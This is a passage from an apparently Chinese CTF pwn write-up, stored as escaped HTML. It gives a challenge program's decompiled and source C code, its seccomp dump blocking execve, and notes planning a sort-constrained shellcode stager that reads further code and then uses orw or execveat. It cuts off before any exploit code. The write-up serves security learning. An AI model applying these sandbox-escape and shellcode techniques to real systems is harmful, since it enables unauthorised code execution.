[rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sandbox();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Just give you ten seconds before you DIE!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = mmap(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;; i &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; --i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d!\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Before you die,I must do something.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::sort&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *&amp;gt;(&amp;amp;unk_203044, &amp;amp;unk_20306C);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;let&amp;#x27;s see what&amp;#x27;U have said&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( j = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; j &amp;lt;= &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;; ++j )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;, DIEnum[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hahahahahaha!Now,taste the fear&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(dest, DIEnum, &lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;))dest)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;sys/prctl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;linux/seccomp.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;linux/filter.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; DIEnum[&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sandbox&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sock_filter&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;filter&lt;/span&gt;[] =&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_JUMP(BPF_JMP+BPF_JEQ,&lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_JUMP(BPF_JMP+BPF_JEQ,&lt;span class=&#34;number&#34;&gt;59&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sock_fprog&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;prog&lt;/span&gt; =&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .len = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt;)(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(filter)/&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(filter[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    .filter = filter,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    prctl(PR_SET_NO_NEW_PRIVS,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;amp;prog);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sandbox();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Just give you ten seconds before you DIE!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* v1=(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)mmap(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0ll&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;;i&amp;gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;--i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d!\n&amp;quot;&lt;/span&gt;,i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Before you die,I must do something.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::sort(DIEnum+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,DIEnum+&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;let&amp;#x27;s see what&amp;#x27;U have said&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;;++i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hahahahahaha!Now,taste the fear&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(v1,DIEnum,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*) (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)) v1)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a href=&#34;#题目分析&#34; class=&#34;headerlink&#34; title=&#34;题目分析&#34;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;​		打眼一看就发现是一个排序，但是由于自己对端续、有符号数、内存值等一些概念不清楚、晕乎了很常见。&lt;/p&gt;
&lt;p&gt;​		首先这道题并不是要找一个最小化的shellcode，直接拿shell（应该是可以绕过的把，），&lt;strong&gt;因为排序的因素，直接拿shell排序会比较难，不如先read进来，没限制了，再干其他的。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;沙箱&#34;&gt;&lt;a href=&#34;#沙箱&#34; class=&#34;headerlink&#34; title=&#34;沙箱&#34;&gt;&lt;/a&gt;沙箱&lt;/h3&gt;&lt;p&gt;​	有沙箱保护 seccomp-tools dump .&amp;#x2F;rop&lt;/p&gt;
&lt;p&gt;execve类似的还有吧    execveat&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0001&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != ARCH_X86_64) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0002&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0003&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000003b&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != execve) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; KILL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff0000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt; if (A &amp;gt;&amp;#x3D; 0x40000000) goto 0006 没有这个哦&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/219077&#34;&gt;https://www.anquanke.com/post/id/219077&lt;/a&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231028123924865.png&#34; alt=&#34;image-20231028123924865&#34; style=&#34;zoom:50%;&#34;&gt;





&lt;p&gt;&lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-905.html&#34;&gt;http://shell-storm.org/shellcode/files/shellcode-905.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	这里有一个比较短的execveat的shellcode，&lt;font color=&#34;red&#34;&gt;但是，仍然比较难排序，因为指令太多了，而且有个长指令必须连起来&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;如果不绕过的话就 orw了&lt;/p&gt;
&lt;h3 id=&#34;对-void-void-dest-的理解&#34;&gt;&lt;a href=&#34;#对-void-void-dest-的理解&#34; class=&#34;headerlink&#34; title=&#34;对 ((void (*)(void))dest)()的理解&#34;&gt;&lt;/a&gt;对 ((void (*)(void))dest)()的理解&lt;/h3&gt;&lt;p&gt;dest怎么理解呢，（还好要到了原题，不然。。也可以自己再写一遍的。。都问题不大，多动手！）&lt;/p&gt;
&lt;p&gt;​	其实就是存放的shellcode的地址，然后当成函数，直接调用这个位置的指令，（就是函数指针）&lt;/p&gt;
&lt;p&gt;​	((void (*)(void))dest)() ， 将dest转换为一个函数指针 ，函数不带参数，且无返回值&lt;/p&gt;
&lt;p&gt;call  rax, 然后就可以执行shellcode吗&lt;/p&gt;
&lt;p&gt;​	rax里存放的是shellcode那里的起始地址，&lt;strong&gt;也就是将要执行的指令的地址&lt;/strong&gt;，call会做两件事，一件是把当前的下一条指令压栈，另外一件是把rax指向的地址赋值给rip（类似于jmp）&lt;/p&gt;
&lt;h2 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;​	长度还有限制，&lt;strong&gt;所以应该是先通过一个read片段，把后续代码读入mmap的空间（不会受排序影响），然后再跳转过去即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;注意可以利用的信息,rdi存储着mmap的地址,可以利用&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​	这里有个细节，读入的地址不要和要执行的jmp重合， 很容易覆盖到jmp那里,影响指令，所以需要往后写，比如rdi+0x100&lt;/p&gt;
&lt;h3 id=&#34;shellcode-排序&#34;&gt;&lt;a href=&#34;#shellcode-排序&#34; class=&#34;headerlink&#34; title=&#34;shellcode 排序&#34;&gt;&lt;/a&gt;shellcode 排序&lt;/h3&gt;&lt;p&gt;64位系统调用规则: rax是系统调用号，参数和函数的一样，rdi、rsi、rdx。。&lt;/p&gt;
&lt;p&gt;00也会被解释的，所以需要补齐，用0x90 nop  0xfc cld这种指令,并且可以利用他们来调整顺序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 